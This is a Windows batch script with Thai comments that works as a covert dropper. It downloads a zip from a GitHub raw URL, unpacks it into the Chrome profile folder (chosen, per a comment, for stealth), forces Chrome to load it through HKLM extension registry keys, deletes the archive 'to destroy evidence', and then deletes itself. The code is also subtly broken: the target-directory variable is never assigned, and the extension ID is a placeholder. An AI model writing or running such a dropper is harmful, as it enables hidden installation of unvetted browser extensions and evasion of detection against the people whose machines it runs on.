@echo off
setlocal enabledelayedexpansion

:: 1. ตั้งค่าตำแหน่งที่จะวางส่วนเสริม (เอาไว้ที่ AppData จะเนียนกว่า)
set "C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Extensions"
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

:: 2. ใช้ PowerShell ดาวน์โหลดไฟล์ส่วนเสริม .zip จาก GitHub
set "EXT_URL=https://raw.githubusercontent.com/wkdopajwiojf/grap/main/onifoepgcccnlehkgoonpaofeolhigpa.zip"
powershell -Command "Invoke-WebRequest -Uri '%EXT_URL%' -OutFile '%TARGET_DIR%\ext.zip'"

:: 3. แตกไฟล์ .zip (ใช้คำสั่งของ Windows 10/11)
powershell -Command "Expand-Archive -Path '%TARGET_DIR%\ext.zip' -DestinationPath '%TARGET_DIR%\ext' -Force"

:: 4. สั่งลงทะเบียนส่วนเสริมผ่าน Registry (แบบ External Unpacked)
:: วิธีนี้จะทำให้ Chrome โหลดส่วนเสริมจากโฟลเดอร์ที่เราวางไว้ทันที
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Google\Chrome\Extensions\ID_ของส่วนเสริมคุณ" /v "path" /t REG_SZ /d "%TARGET_DIR%\ext" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Google\Chrome\Extensions\ID_ของส่วนเสริมคุณ" /v "version" /t REG_SZ /d "1.0" /f

:: 5. ลบไฟล์ .zip ทิ้งเพื่อทำลายหลักฐาน
del "%TARGET_DIR%\ext.zip"

:: 6. สั่งปิดและเปิด Chrome ใหม่เพื่อให้ส่วนเสริมทำงาน (เลือกใช้หรือไม่ใช้ก็ได้)
:: taskkill /F /IM chrome.exe /T
:: start chrome.exe

:: 7. ลบตัวเองทิ้ง
(goto) 2>nul & del "%~f0"
